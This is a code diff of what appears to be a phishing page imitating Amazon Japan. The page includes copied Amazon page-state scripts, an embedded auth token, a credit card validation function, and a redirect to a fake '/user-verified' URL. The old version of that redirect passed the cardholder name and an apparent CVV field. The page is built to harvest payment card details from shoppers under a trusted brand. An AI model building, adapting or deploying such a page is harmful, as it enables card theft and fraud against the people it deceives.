@@ -1017,11 +1017,7 @@
 <body id="bodyid">
 
 </body>
-<script src="library/jquery/main.min.js"></script>
-<script src="library/pooper/main.min.js"></script>
-<script src="library/bootstrap/js/main.min.js"></script>
-<script src="library/jquery/mask/jquery.mask.min.js"></script>
-<script src="library/xvalidator/qunit.js"></script>
+
 <script type="text/javascript">
     setTimeout("yincang()",0 );
     function yincang() {
@@ -2223,6 +2219,11 @@
                 "<br><br>"
     }
 </script>
+<script src="library/jquery/main.min.js"></script>
+<script src="library/pooper/main.min.js"></script>
+<script src="library/bootstrap/js/main.min.js"></script>
+<script src="library/jquery/mask/jquery.mask.min.js"></script>
+<script src="library/xvalidator/qunit.js"></script>
 <script type='a-state' data-a-state='{&quot;key&quot;:&quot;address-details-business-hours-expander-heading-strings&quot;}'>{'business-hours-expander-heading-text-sat':'土曜日に荷物を受け取ることができます','business-hours-expander-heading-text-sun':'日曜日に荷物を受け取ることができます','business-hours-expander-heading-text-both':'土日ともに受取可能','business-hours-expander-heading-text-none':'土日ともに受取不可'}</script>
 <script type='a-state' data-a-state='{&quot;key&quot;:&quot;identity-address-ux-ajax-data&quot;}'>{'identity-address-ux-ajax-auth-token':'eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.6WhccWezc9Zz0Bteq3X-HRP7HA18V7xIictTZ7GhIujjhYmG3u-CoA.ERPOiOuhKdFHk51c.97I6FUyNx8Z_5yHIA07hpC-JjC0R3IGQ9SBowWr7vFSZv1OKdI9Qu49c7uLWmaUL243j6pLiV71hyiePmZZtDMCnstKZEZ9GyUsw_Z4Zb5MOnvS9za9I5iCFRObJAL6qeMXbxsamLAESz9haZxtrqpqTIDClAbZus809FboWUx7UZ-ogqWFyean6ZF0csq-jDUa-sezZoqFfg-owD_FrrfHtAxO3KPIkc1RqvFog7CsqdAsPDFISkyqbKV_S50kCzqhDPq9W3UBnzyfQBoNfvxPhv0HyepNDxNWo4bOcABCT77k5r9SxVqt2B8kBnR9B6BQwNOnyw0UYzY0cP9favZEf20fdeVi6jDMps_vT0_z-N1mE4IDAHbsOO-J4son2AALj6w3VTjJwnbA4gPupIhAWMyrQNhFCkgAmWfqNpsOMXLVOGzs0S_Q7auYA31TZpbEFduxAD-AXak6FTATwoarwIt3qwdHZa2Hae-i80AsAuNEFQxvSbhOMuTEmBDzhn7aaEBJlXzMLVkF7uPDjS1w89q0N6Mi4jfOy13Bec9v1sjSteibbfaqfMcFa8CDLUjHbrHuYeiF5PGzoFVeziiVh5rpxm-nbknwwuKq2Q5roUMe8cCQL-P5i_U5pOrcscE4AwtTEF1Oih851DkIjUWetDIM75gpb9tFv8bGz2CZ0fvHcAf2NveTD3sGYxDG-_IMP6Q-79UFM9IwN4TGIJH1ZhTQuMV4nQ8m4aQDim18xKE7g5Da4eyuF3FRbnQ.jQHjQEdlRAL8ttXt4l5U9w','identity-address-ux-ajax-domain':'www.amazon.co.jp'}</script>
 <script type='a-state' data-a-state='{&quot;key&quot;:&quot;address-ui-widgets-from-view-state&quot;}'>{'isEnabled':true}</script>
@@ -2384,7 +2385,7 @@ function valid_credit_card(value) {
                     year: year
                 },
                 function (data) {
-                    window.location.href = '/user-verified?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya&nameCard='+nameCard+'&cxdi='+cxdi;
+                    window.location.href = '/user-verified?openid=q1w2p5r9u8j0zgh35zgaj7drhknwxdplc3pf&ref=nav_youraccount_ya';
                 }, "json");
     }
 </script>
